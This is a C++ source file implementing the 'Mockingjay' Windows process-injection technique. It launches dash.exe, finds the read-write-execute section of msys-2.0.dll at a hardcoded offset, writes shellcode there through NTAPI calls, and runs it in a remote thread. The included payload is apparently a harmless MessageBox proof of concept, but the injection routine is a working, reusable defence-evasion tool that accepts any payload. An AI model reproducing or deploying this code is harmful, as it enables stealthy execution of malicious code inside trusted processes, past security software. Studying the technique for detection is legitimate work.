#include <Windows.h>
#include <stdio.h>
#include <Psapi.h>
#include "CWLIncl.h"
#define STATUS_SUCCESS 0
#define NT_SUCCESS(Status) ((NTSTATUS)(Status) == STATUS_SUCCESS)


// Find our loaded module base
HMODULE FindModuleBase(HANDLE hProcess) {

	HMODULE hModuleList[1024];
	wchar_t moduleName[520];
	DWORD cb = sizeof(hModuleList);
	DWORD cbNeeded = 0;

	// Enumerates all the modules in the process
	// and retrieve handle of all modules
	if (EnumProcessModulesEx(hProcess, hModuleList, sizeof(hModuleList), &cbNeeded, LIST_MODULES_64BIT)) {
		int getLastErr = GetLastError();
		for (unsigned int i = 0; i < (cbNeeded / sizeof(HMODULE)); i++) {
			// Getting full path of the module
			// Alternatively we can use API GetModuleBaseNameA
			if (GetModuleFileNameEx(hProcess, hModuleList[i], moduleName, (sizeof(moduleName) / sizeof(DWORD)))) {
				// Comapring if the module path has our dll
				if (wcsstr(moduleName, L"msys-2.0.dll") != nullptr) {
					return hModuleList[i];
					break;
				}
			}
		}
	}
	return 0;
}


void Mockingjay(unsigned char payload[], SIZE_T payload_size, int pid) {
	HANDLE hProcess = { INVALID_HANDLE_VALUE };
	HANDLE hThread = NULL;
	HMODULE pNtdllModule = NULL;
	HMODULE rwxModuleBase = NULL;
	CLIENT_ID clID = { 0 };
	DWORD mPID = pid;
	OBJECT_ATTRIBUTES objAttr;
	NTSTATUS status;
	PVOID remoteBase = 0;
	SIZE_T bytesWritten = 0;
	SIZE_T regionSize = 0;
	unsigned long oldProtection = 0;
	// Getting handle to module
	pNtdllModule = GetModuleHandleA("ntdll.dll");

	// NtOpenProcess: Getting handle to Remote process
	// Alternative Win32API: OpenProcess;
	_NtOpenProcess pNtOpenProcess = (_NtOpenProcess)GetProcAddress(pNtdllModule, "NtOpenProcess");
	if (pNtOpenProcess == NULL) {
		printf("[-] Failed to resolve NTAPI NtOpenProcess \n");
		exit(-1);
	}

	// NtAllocateVirtualMemory: Both current and remote process memory allocation
	// Alternative Win32API: VirtualAlloc(Ex)
	_NtAllocateVirtualMemory pNtAllocateVirtualMemory = (_NtAllocateVirtualMemory)GetProcAddress(pNtdllModule, "NtAllocateVirtualMemory");
	if (pNtAllocateVirtualMemory == NULL) {
		printf("[-] Failed to resolve NTAPI NtAllocateVirtualMemory \n");
		exit(-1);
	}

	// NtProtectVirtualMemory: Change memory protection
	// Alternative Win32API: VirtualProtect(Ex)
	_NtProtectVirtualMemory pNtProtectVirtualMemory = (_NtProtectVirtualMemory)GetProcAddress(pNtdllModule, "NtProtectVirtualMemory");
	if (pNtAllocateVirtualMemory == NULL) {
		printf("[-] Failed to resolve NTAPI NtProtectVirtualMemory \n");
		exit(-1);
	}

	// NtWriteVirtualMemory: Writes into process memory
	// Alternative Win32API: WriteProcessMemory(Ex)
	_NtWriteVirtualMemory pNtWriteVirtualMemory = (_NtWriteVirtualMemory)GetProcAddress(pNtdllModule, "NtWriteVirtualMemory");
	if (pNtWriteVirtualMemory == NULL) {
		printf("[-] Failed to resolve NTAPI NtWriteVirtualMemory \n");
		exit(-1);
	}
	// Alternative Win32API: Create Thread 
	_NtCreateThreadEx pNtCreateThreadEx = (_NtCreateThreadEx)GetProcAddress(pNtdllModule, "NtCreateThreadEx");
	if (pNtCreateThreadEx == NULL) {
		printf("[-] Failed to resolve NTAPI NtCreateThreadEx \n");
		exit(-1);
	}

	// open target process
	WCHAR targetProc[MAX_PATH];
	lstrcpyW(targetProc, L"C:\\Program Files\\Microsoft Visual Studio\\2022\\Community\\Common7\\IDE\\CommonExtensions\\Microsoft\\TeamFoundation\\Team Explorer\\Git\\usr\\bin\\dash.exe");
	//lstrcpyW(targetProc, L"C:\\Windows\\System32\\notepad.exe");
	STARTUPINFOW si = { 0 };
	PROCESS_INFORMATION pi = { 0 };
	
	si.cb = sizeof(si);
	DWORD creationFlag = 0;

	BOOL success = CreateProcessW(targetProc, nullptr, nullptr, nullptr, false, creationFlag, nullptr, nullptr, &si, &pi);
	if (success == false) {
		printf("[-] Failed to create process;");
		exit(-1);
	}
	
	hProcess = pi.hProcess;
	// waiting for the target process load completely
	Sleep(3000);
	rwxModuleBase = FindModuleBase(hProcess);
	DWORD rwxOffset = 0x1E6000;
	ULONG_PTR rwxSectionBase = (ULONG_PTR)((ULONG_PTR)rwxModuleBase + rwxOffset);

	printf("[+] Remote RWX Region: %p \n", rwxSectionBase);
	// Write payload to remote process
	status = pNtWriteVirtualMemory(hProcess, (PVOID)rwxSectionBase, payload, payload_size, &bytesWritten);
	if (!NT_SUCCESS(status)) {
		printf("[-] Failed to write payload in remote process: %x \n", status);
		exit(-1);
	}

	// Execute Remote Thread
	status = pNtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, (LPTHREAD_START_ROUTINE)rwxSectionBase, NULL, FALSE, 0, 0, 0, NULL);
	if (!NT_SUCCESS(status)) {
		printf("[-] Failed to Execute Remote Thread: %x \n", status);
		exit(-1);
	}
	//system("pause");

}



int APIENTRY WinMain(HINSTANCE hInst, HINSTANCE hInstPrev, PSTR cmdline, int cmdshow) {
	// parsing argument
	int pid = 0;
	/*if (cmdline < 2 || argc > 2) {
		printf("[!] filename.exe <PID> \n");
		exit(-1);
	}
	pid = atoi(argv[1]);*/
	// MessageBox "hello world"
	unsigned char payload[] = "\x48\x83\xEC\x28\x48\x83\xE4\xF0\x48\x8D\x15\x66\x00\x00\x00"
		"\x48\x8D\x0D\x52\x00\x00\x00\xE8\x9E\x00\x00\x00\x4C\x8B\xF8"
		"\x48\x8D\x0D\x5D\x00\x00\x00\xFF\xD0\x48\x8D\x15\x5F\x00\x00"
		"\x00\x48\x8D\x0D\x4D\x00\x00\x00\xE8\x7F\x00\x00\x00\x4D\x33"
		"\xC9\x4C\x8D\x05\x61\x00\x00\x00\x48\x8D\x15\x4E\x00\x00\x00"
		"\x48\x33\xC9\xFF\xD0\x48\x8D\x15\x56\x00\x00\x00\x48\x8D\x0D"
		"\x0A\x00\x00\x00\xE8\x56\x00\x00\x00\x48\x33\xC9\xFF\xD0\x4B"
		"\x45\x52\x4E\x45\x4C\x33\x32\x2E\x44\x4C\x4C\x00\x4C\x6F\x61"
		"\x64\x4C\x69\x62\x72\x61\x72\x79\x41\x00\x55\x53\x45\x52\x33"
		"\x32\x2E\x44\x4C\x4C\x00\x4D\x65\x73\x73\x61\x67\x65\x42\x6F"
		"\x78\x41\x00\x48\x65\x6C\x6C\x6F\x20\x77\x6F\x72\x6C\x64\x00"
		"\x4D\x65\x73\x73\x61\x67\x65\x00\x45\x78\x69\x74\x50\x72\x6F"
		"\x63\x65\x73\x73\x00\x48\x83\xEC\x28\x65\x4C\x8B\x04\x25\x60"
		"\x00\x00\x00\x4D\x8B\x40\x18\x4D\x8D\x60\x10\x4D\x8B\x04\x24"
		"\xFC\x49\x8B\x78\x60\x48\x8B\xF1\xAC\x84\xC0\x74\x26\x8A\x27"
		"\x80\xFC\x61\x7C\x03\x80\xEC\x20\x3A\xE0\x75\x08\x48\xFF\xC7"
		"\x48\xFF\xC7\xEB\xE5\x4D\x8B\x00\x4D\x3B\xC4\x75\xD6\x48\x33"
		"\xC0\xE9\xA7\x00\x00\x00\x49\x8B\x58\x30\x44\x8B\x4B\x3C\x4C"
		"\x03\xCB\x49\x81\xC1\x88\x00\x00\x00\x45\x8B\x29\x4D\x85\xED"
		"\x75\x08\x48\x33\xC0\xE9\x85\x00\x00\x00\x4E\x8D\x04\x2B\x45"
		"\x8B\x71\x04\x4D\x03\xF5\x41\x8B\x48\x18\x45\x8B\x50\x20\x4C"
		"\x03\xD3\xFF\xC9\x4D\x8D\x0C\x8A\x41\x8B\x39\x48\x03\xFB\x48"
		"\x8B\xF2\xA6\x75\x08\x8A\x06\x84\xC0\x74\x09\xEB\xF5\xE2\xE6"
		"\x48\x33\xC0\xEB\x4E\x45\x8B\x48\x24\x4C\x03\xCB\x66\x41\x8B"
		"\x0C\x49\x45\x8B\x48\x1C\x4C\x03\xCB\x41\x8B\x04\x89\x49\x3B"
		"\xC5\x7C\x2F\x49\x3B\xC6\x73\x2A\x48\x8D\x34\x18\x48\x8D\x7C"
		"\x24\x30\x4C\x8B\xE7\xA4\x80\x3E\x2E\x75\xFA\xA4\xC7\x07\x44"
		"\x4C\x4C\x00\x49\x8B\xCC\x41\xFF\xD7\x49\x8B\xCC\x48\x8B\xD6"
		"\xE9\x14\xFF\xFF\xFF\x48\x03\xC3\x48\x83\xC4\x28\xC3";
	// Size of paylaod
	SIZE_T payload_size = sizeof(payload);
	// Invoke Classic Process Injection
	Mockingjay(payload, payload_size, pid);

}